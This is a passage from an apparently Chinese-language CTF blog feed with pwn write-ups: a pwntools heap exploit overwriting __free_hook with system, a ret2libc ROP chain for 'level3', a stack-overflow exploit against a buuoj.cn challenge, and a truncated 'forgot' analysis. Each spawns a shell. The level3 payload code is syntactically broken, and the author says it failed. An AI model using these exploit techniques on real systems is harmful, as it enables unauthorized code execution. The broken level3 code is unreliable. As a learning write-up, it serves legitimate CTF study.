class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line"><span class="comment">#context.log_level = "debug"</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">local</span> = True</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">local</span>:</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">"./secret\_of\_my_heart"</span>)</span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">"/lib/x86_64-linux-gnu/libc.so.6"</span>)</span><br><span class="line"></span><br><span class="line">bin_offset = 0x3C4B20 + 0x58</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">"chall.pwnable.tw"</span>,<span class="string">"10302"</span>)</span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">"./libc_64.so.6"</span>)</span><br><span class="line"></span><br><span class="line">bin_offset = 0x3C3B20 + 0x58</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">"./secret_of_my_heart"</span>)</span><br><span class="line"></span><br><span class="line">def new(size,name,secret):</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">"choice :"</span>,str(1))</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">"Size of heart : "</span>,str(size))</span><br><span class="line"></span><br><span class="line">p.sendafter(<span class="string">"Name of heart :"</span>,name)</span><br><span class="line"></span><br><span class="line">p.sendafter(<span class="string">"secret of my heart :"</span>,secret)</span><br><span class="line"></span><br><span class="line">def show(index):</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">"choice :"</span>,str(2))</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">"Index :"</span>,str(index))</span><br><span class="line"></span><br><span class="line">def free(index):</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">"choice :"</span>,str(3))</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">"Index :"</span>,str(index))</span><br><span class="line"></span><br><span class="line">new(0xF8,<span class="string">"a"</span>*0x20,<span class="string">"aaaa"</span>)<span class="comment">#0 100</span></span><br><span class="line"></span><br><span class="line">new(0xF8,<span class="string">"b"</span>*0x20,<span class="string">"bbbb"</span>)<span class="comment">#1 100</span></span><br><span class="line"></span><br><span class="line">show(1)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"b"</span>*0x20)</span><br><span class="line"></span><br><span class="line">heap_addr = u64(p.recvline()[:-1].ljust(0x8,<span class="string">"\x00"</span>))</span><br><span class="line"></span><br><span class="line">success(<span class="string">"heap_address ===&gt; "</span> + hex(heap_addr))</span><br><span class="line"></span><br><span class="line">new(0x68,<span class="string">"c"</span>*0x20,<span class="string">"cccc"</span>)<span class="comment">#2 70</span></span><br><span class="line"></span><br><span class="line">new(0x68,<span class="string">"d"</span>*0x20,<span class="string">"dddd"</span>)<span class="comment">#3 70</span></span><br><span class="line"></span><br><span class="line">new(0xF8,<span class="string">"d"</span>*0x20,<span class="string">"dddd"</span>)<span class="comment">#4 100</span></span><br><span class="line"></span><br><span class="line">new(0xF8,<span class="string">"padding\n"</span>,<span class="string">"padding\n"</span>)<span class="comment">#5</span></span><br><span class="line"></span><br><span class="line">free(0)</span><br><span class="line"></span><br><span class="line">free(3)</span><br><span class="line"></span><br><span class="line">offset = 0x55a9d344a2c0 - 0x55a9d344a110</span><br><span class="line"></span><br><span class="line">attack_heap = heap_addr + offset</span><br><span class="line"></span><br><span class="line">new(0x68,<span class="string">"d"</span>*0x20,<span class="string">"d"</span>*0x40 + p64(0x0) + p64(0x71) + p64(attack_heap) + p64(0x00) + p64(0x100+0x100+0x70+0x70)) <span class="comment">#0</span></span><br><span class="line"></span><br><span class="line">free(4)</span><br><span class="line"></span><br><span class="line">new(0xF8,<span class="string">"a"</span>*0x20,<span class="string">"aaaa"</span>)<span class="comment">#3</span></span><br><span class="line"></span><br><span class="line">show(1)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"Secret : "</span>)</span><br><span class="line"></span><br><span class="line">bin_addr = u64(p.recvline()[:-1].ljust(0x8,<span class="string">"\x00"</span>))</span><br><span class="line"></span><br><span class="line">libc.address = bin_addr - bin_offset</span><br><span class="line"></span><br><span class="line">free_hook = libc.symbols[<span class="string">'__free_hook'</span>]</span><br><span class="line"></span><br><span class="line">success(<span class="string">"libc_address ===&gt; "</span> + hex(libc.address))</span><br><span class="line"></span><br><span class="line">success(<span class="string">"system_address ===&gt; "</span> + hex(libc.symbols[<span class="string">'system'</span>]))</span><br><span class="line"></span><br><span class="line">success(<span class="string">"__free_hook ===&gt; "</span> + hex(free_hook))</span><br><span class="line"></span><br><span class="line">free(2)</span><br><span class="line"></span><br><span class="line">log.info(<span class="string">"attack_heap_address ===&gt; "</span> + hex(attack_heap))</span><br><span class="line"></span><br><span class="line">new(0xE8,<span class="string">"test"</span>,<span class="string">"test"</span>) <span class="comment">#2</span></span><br><span class="line"></span><br><span class="line">new((0x70+0x70),<span class="string">"attack"</span>,p64(0x00)+p64(0x71)+p64(attack_heap)) <span class="comment">#4</span></span><br><span class="line"></span><br><span class="line">new(0x68,<span class="string">"test"</span>,<span class="string">"/bin/sh\x00"</span>) <span class="comment">#6</span></span><br><span class="line"></span><br><span class="line">new(0x68,<span class="string">"attack"</span>,p64(free_hook-0x43) + <span class="string">"\x00"</span> * 0x10 + p64(0x101)+p64(0xdeadbeef)+p64(free_hook-0x50))</span><br><span class="line"></span><br><span class="line">new(0xF8,<span class="string">"attack"</span>,<span class="string">"attack"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#unsorted bin attack</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">"\x00"</span> * 0x33 + p64(libc.symbols[<span class="string">'system'</span>])</span><br><span class="line"></span><br><span class="line">new(0x68,<span class="string">"attack"</span>,<span class="string">"attack"</span>)</span><br><span class="line"></span><br><span class="line">new(0x68,<span class="string">"attack"</span>,payload)</span><br><span class="line"></span><br><span class="line">free(6)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;例题讲解&quot;&gt;&lt;a href=&quot;#例题讲解&quot; class=&quot;headerlink&quot; title=&quot;例题讲解&quot;&gt;&lt;/a&gt;例题讲解&lt;/h3&gt;&lt;p&gt;原文链接：&lt;a href=&quot;https://www.anquanke.com/post/id/171283&quot; target=
      
    
    </summary>
    
      <category term="理论知识" scheme="http://yoursite.com/categories/%E7%90%86%E8%AE%BA%E7%9F%A5%E8%AF%86/"/>
    
    
      <category term="pwn" scheme="http://yoursite.com/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>python100例</title>
    <link href="http://yoursite.com/2019/07/27/python100%E4%BE%8B/"/>
    <id>http://yoursite.com/2019/07/27/python100例/</id>
    <published>2019-07-27T12:01:58.329Z</published>
    <updated>2019-07-27T12:01:36.275Z</updated>
    
    <content type="html"><![CDATA[<h3 id="第一题"><a href="#第一题" class="headerlink" title="第一题"></a>第一题</h3><p> 日常更新</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">题目：有四个数字：1、2、3、4，能组成多少个互不相同且无重复数字的三位数？各是多少？</span><br><span class="line"></span><br><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(1,5):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(1,5):</span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> range(1,5):</span><br><span class="line">            <span class="keyword">if</span>( i != k ) and (i != j) and (j != k):</span><br><span class="line">                <span class="built_in">print</span> i,j,k</span><br></pre></td></tr></table></figure><h3 id="第二题"><a href="#第二题" class="headerlink" title="第二题"></a>第二题</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;第一题&quot;&gt;&lt;a href=&quot;#第一题&quot; class=&quot;headerlink&quot; title=&quot;第一题&quot;&gt;&lt;/a&gt;第一题&lt;/h3&gt;&lt;p&gt; 日常更新&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gut
      
    
    </summary>
    
      <category term="python基础" scheme="http://yoursite.com/categories/python%E5%9F%BA%E7%A1%80/"/>
    
    
      <category term="python" scheme="http://yoursite.com/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>babyheap</title>
    <link href="http://yoursite.com/2019/07/27/baby_heap/"/>
    <id>http://yoursite.com/2019/07/27/baby_heap/</id>
    <published>2019-07-27T11:26:14.896Z</published>
    <updated>2019-07-27T11:26:49.538Z</updated>
    
    <summary type="html">
    
    </summary>
    
      <category term="RCTF 2019" scheme="http://yoursite.com/categories/RCTF-2019/"/>
    
    
      <category term="pwn" scheme="http://yoursite.com/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>easy_heap</title>
    <link href="http://yoursite.com/2019/07/27/easy_heap/"/>
    <id>http://yoursite.com/2019/07/27/easy_heap/</id>
    <published>2019-07-27T11:24:51.374Z</published>
    <updated>2019-07-27T11:26:00.113Z</updated>
    
    <summary type="html">
    
    </summary>
    
      <category term="sctf 2019" scheme="http://yoursite.com/categories/sctf-2019/"/>
    
    
      <category term="pwn" scheme="http://yoursite.com/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>level3</title>
    <link href="http://yoursite.com/2019/07/27/level3/"/>
    <id>http://yoursite.com/2019/07/27/level3/</id>
    <published>2019-07-27T11:23:08.790Z</published>
    <updated>2019-07-27T11:43:37.436Z</updated>
    
    <content type="html"><![CDATA[<h3 id="0x01-寻找漏洞"><a href="#0x01-寻找漏洞" class="headerlink" title="0x01 寻找漏洞"></a>0x01 寻找漏洞</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">xfgg@ubuntu:~/Downloads$ checksec level3</span><br><span class="line">[*] <span class="string">'/home/xfgg/Downloads/level3'</span></span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br><span class="line">只有nx保护</span><br><span class="line"></span><br><span class="line">ida分析</span><br><span class="line"></span><br><span class="line">ssize_t vulnerable_function()</span><br><span class="line">&#123;</span><br><span class="line">char buf; // [esp+0h] [ebp-88h]</span><br><span class="line"></span><br><span class="line">write(1, <span class="string">"Input:\n"</span>, 7u);</span><br><span class="line"><span class="built_in">return</span> <span class="built_in">read</span>(0, &amp;buf, 0x100u);</span><br><span class="line">&#125;</span><br><span class="line">很明显的栈溢出漏洞，但是没有system函数和/bin/sh字符串了 这里有一个新的模式，泄露函数got表中的地址获取到库中某个函数的真正加载地址，通过偏移找出函数的库，通过然后找出其他函数的真正加载地址，包括system函数也包括/bin/sh字符串</span><br><span class="line"></span><br><span class="line">xfgg@ubuntu:~/Downloads$ ROPgadget --binary level3 --only <span class="string">"pop|ret"</span></span><br><span class="line">Gadgets information</span><br><span class="line">============================================================</span><br><span class="line">0x0804851b : pop ebp ; ret</span><br><span class="line">0x08048518 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret</span><br><span class="line">0x080482f1 : pop ebx ; ret</span><br><span class="line">0x0804851a : pop edi ; pop ebp ; ret</span><br><span class="line">0x08048519 : pop esi ; pop edi ; pop ebp ; ret</span><br><span class="line">0x080482da : ret</span><br><span class="line">0x080483ce : ret 0xeac1</span><br><span class="line"></span><br><span class="line">我们选中这里作为ROP的位置</span><br><span class="line">0x08048519 : pop esi ; pop edi ; pop ebp ; ret</span><br><span class="line">0x080482da : ret</span><br><span class="line">0x080483ce : ret 0xeac1</span><br></pre></td></tr></table></figure><h3 id="0x02-思路分析"><a href="#0x02-思路分析" class="headerlink" title="0x02 思路分析"></a>0x02 思路分析</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">构造payload: payload=’A’0x88+’A’4+p32(plt_write)+p32(main_addr)+p32(1)+p32(got_write)+p32(4)</span><br><span class="line"></span><br><span class="line">这一部分是为了泄露出来write 函数的got表内容 payload = “A” 0x88 + “A” 4 + p32(plt_read) + p32(pop_pop_pop_ret) + p32(0) + p32(bss_addr) + p32(8)</span><br><span class="line"></span><br><span class="line">这一部分会返等待输入，把输入的内容放到bss_addr。返回地址pop_pop_pop_ret保证堆栈平衡 payload+=p32(system_addr)+p32(0x77777777)+p32(bin_sh_addr)</span><br><span class="line"></span><br><span class="line">这一部分是为了执行system(“/bin/sh”)函数。会执行system(<span class="string">"/bin/sh"</span>)是因为发送过去的payload在函数返回时才会起作用</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">pop_pop_pop_ret=0x08048519</span><br><span class="line"></span><br><span class="line">elf=ELF(<span class="string">"/home/xfgg/level3"</span>) <span class="comment">##载入level3程序</span></span><br><span class="line"></span><br><span class="line">plt_write=elf.plt[<span class="string">"write"</span>]</span><br><span class="line">got_write=elf.got[<span class="string">"write"</span>]</span><br><span class="line"></span><br><span class="line">p=remote(<span class="string">"111.198.29.45"</span>,41869)</span><br><span class="line"><span class="comment">##获取level3的write的plt表和got表</span></span><br><span class="line">p.recvline()</span><br><span class="line"></span><br><span class="line"><span class="comment">##因为程序中调用了write()函数，write()函数是从Libc中动态调用的，所以，我们可以根据write()在libc中的地址通过偏移泄露出##libc的版本</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">"A"</span>0x88+<span class="string">"A"</span>4+p32(plt_write)+p32(pop_pop_pop_ret)+p32(1)+p32(got_write)+p32(4)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">write_addr=u32(p.recv(4))</span><br><span class="line"></span><br><span class="line"><span class="comment">## u32():表示unsigned long int,而且只接受4字节就够用了</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> <span class="string">"write_addr="</span>+hex(write_addr)</span><br><span class="line"></span><br><span class="line"><span class="comment">##这里泄露libc的版本，运行这段代码就能获取到write函数的运行地址(放在write_addr里面)。 运行结果为write_addr=0xf7dfad80为了获取到libc版本这里推荐一个网站https://libc.blukat.me/?q=write%3A0x7f2179c14440。可以在这里通过函数名和地址查询出运行库的版本也提供下载。（如果一个地址查到不止一个库版本可以试着再泄露一个函数) 当然也可以自动获取，这个更可靠，pwntools提供的有库LibcSearcher。由于本人的电脑重装，还没安这个库，所以，没有直接用，而是跟LibcSearcher一样的方式，先泄露然后查找</span></span><br><span class="line"></span><br><span class="line"><span class="comment">##我选择的是libcsearcher</span></span><br></pre></td></tr></table></figure><h3 id="0x03-攻击"><a href="#0x03-攻击" class="headerlink" title="0x03 攻击"></a>0x03 攻击</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">write函数和libc泄露，写入system(<span class="string">'/bin/sh'</span>)</span><br></pre></td></tr></table></figure><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">pop_pop_pop_ret=0x08048519</span><br><span class="line">elf=ELF(<span class="string">"/home/xfgg/level3"</span>)</span><br><span class="line">main_addr=0x08048484</span><br><span class="line">plt_write=elf.plt[<span class="string">"write"</span>]</span><br><span class="line"></span><br><span class="line">def leak(address):</span><br><span class="line">p.recvline()</span><br><span class="line">payload = <span class="string">"A"</span> 0x88 + <span class="string">"A"</span> 4 + p32(plt_write) + p32(main_addr) + p32(1) + p32(address) + p32(4)</span><br><span class="line">p.send(payload)</span><br><span class="line">data=p.recv(4)</span><br><span class="line"><span class="built_in">print</span> hex(u32(data))</span><br><span class="line"><span class="built_in">print</span> <span class="string">"%#x =&gt; %s"</span> % (address,(data or <span class="string">''</span>).encode(<span class="string">'hex'</span>))</span><br><span class="line"><span class="built_in">return</span> data</span><br><span class="line"></span><br><span class="line">p=remote(<span class="string">"111.198.29.45"</span>,41869)</span><br><span class="line"></span><br><span class="line">d=DynELF(leak,elf=ELF(<span class="string">"./level3"</span>))</span><br><span class="line">system_addr=d.lookup(<span class="string">'system'</span>,<span class="string">'libc'</span>)</span><br><span class="line"><span class="built_in">print</span> <span class="string">"system_addr="</span>+hex(system_addr)</span><br><span class="line"></span><br><span class="line">bss_addr=0x0804a024</span><br><span class="line">plt_read=elf.plt[<span class="string">"read"</span>]</span><br><span class="line">p.recvline()</span><br><span class="line">sleep(1)</span><br><span class="line">payload = <span class="string">"A"</span> 0x88 + <span class="string">"A"</span> 4 + p32(plt_read) + p32(pop_pop_pop_ret) + p32(0) + p32(bss_addr) + p32(8)</span><br><span class="line">payload+=p32(system_addr)+p32(0x77777777)+p32(bss_addr)</span><br><span class="line"></span><br><span class="line">raw_input() <span class="comment">##raw_input():获取控制台的输入因为前面睡了一秒，所以，通过raw_input()获得控制台的输入，然后输入payload</span></span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">"/bin/sh"</span>)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line">不知道为什么失败了 ，这种题目还是要多做，有点难搞</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;0x01-寻找漏洞&quot;&gt;&lt;a href=&quot;#0x01-寻找漏洞&quot; class=&quot;headerlink&quot; title=&quot;0x01 寻找漏洞&quot;&gt;&lt;/a&gt;0x01 寻找漏洞&lt;/h3&gt;&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td
      
    
    </summary>
    
      <category term="攻防世界" scheme="http://yoursite.com/categories/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/"/>
    
    
      <category term="pwn" scheme="http://yoursite.com/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>pwn1</title>
    <link href="http://yoursite.com/2019/07/27/pwn1/"/>
    <id>http://yoursite.com/2019/07/27/pwn1/</id>
    <published>2019-07-27T11:14:56.919Z</published>
    <updated>2019-07-27T11:20:25.721Z</updated>
    
    <content type="html"><![CDATA[<h3 id="0x01-寻找漏洞"><a href="#0x01-寻找漏洞" class="headerlink" title="0x01 寻找漏洞"></a>0x01 寻找漏洞</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">很简单的栈溢出 </span><br><span class="line"></span><br><span class="line">int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  char s; // [rsp+1h] [rbp-Fh]</span><br><span class="line"></span><br><span class="line">  puts(<span class="string">"please input"</span>);</span><br><span class="line">  gets(&amp;s, argv);</span><br><span class="line">  puts(&amp;s);</span><br><span class="line">  puts(<span class="string">"ok,bye!!!"</span>);</span><br><span class="line">  <span class="built_in">return</span> 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int fun()</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">return</span> system(<span class="string">"/bin/sh"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="0x02-思路分析"><a href="#0x02-思路分析" class="headerlink" title="0x02 思路分析"></a>0x02 思路分析</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">不解释，前面有一样的</span><br></pre></td></tr></table></figure><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">p=remote(<span class="string">'buuoj.cn'</span>,6001)</span><br><span class="line">fun_addr=0x0000000000401186</span><br><span class="line">payload=<span class="string">'a'</span>*0x0f+<span class="string">'a'</span>*8+p64(fun_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;0x01-寻找漏洞&quot;&gt;&lt;a href=&quot;#0x01-寻找漏洞&quot; class=&quot;headerlink&quot; title=&quot;0x01 寻找漏洞&quot;&gt;&lt;/a&gt;0x01 寻找漏洞&lt;/h3&gt;&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td
      
    
    </summary>
    
      <category term="BUUCTF" scheme="http://yoursite.com/categories/BUUCTF/"/>
    
    
      <category term="pwn" scheme="http://yoursite.com/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>forgot</title>
    <link href="http://yoursite.com/2019/07/27/forgot/"/>
    <id>http://yoursite.com/2019/07/27/forgot/</id>
    <published>2019-07-27T11:02:27.671Z</published>
    <updated>2019-07-27T11:13:03.351Z</updated>
    
    <content type="html"><![CDATA[<h3 id="0x01-寻找漏洞"><a href="#0x01-寻找漏洞" class="headerlink" title="0x01 寻找漏洞"></a>0x01 寻找漏洞</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">xfgg@ubuntu:~/Downloads$ checksec forgot</span><br><span class="line">[*] <span class="string">'/home/xfgg/Downloads/forgot'</span></span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br><span class="line"></span><br><span class="line">只开启了nx保护</span><br><span class="line"></span><br><span class="line">ida分析</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20190708074114251.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzMTg5NzU3,size_16,color_FFFFFF,t_70" alt></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">发现有两处溢出点</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20190708074419714.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzMTg5NzU3,size_16,color_FFFFFF,t_70" alt></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">可以观察到箭头处是个函数指针，&amp;v3 是v3在栈上的地址，&amp;v3 + --v14 是根据&amp;v3在栈上移动，上面的<span class="keyword">for</span>循环是用来改变v14的值，根据溢出点函数指针v3到v12 ，变量v14都可以被我们控制，接下来再找找有没有system函数</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20190708075022550.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzMTg5NzU3,size_16,color_FFFFFF,t_70" alt></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">发现目标函数</span><br></pre></td></tr></table></figure><h3 id="0x02-思路分析"><a href="#0x02-思路分析" class="headerlink" title="0x02 思路分析"></a>0x02 思路分析</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">接下来我的想法是利用缓冲区溢出把函数指针v12 覆盖为地址0x080486cc,接下来再控制v14的值为10， 那么 &amp;v3+ --v14 便会指向</span><br><span class="line">v12，随后cat flag</span><br></pre></td></tr></table></figure><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">from 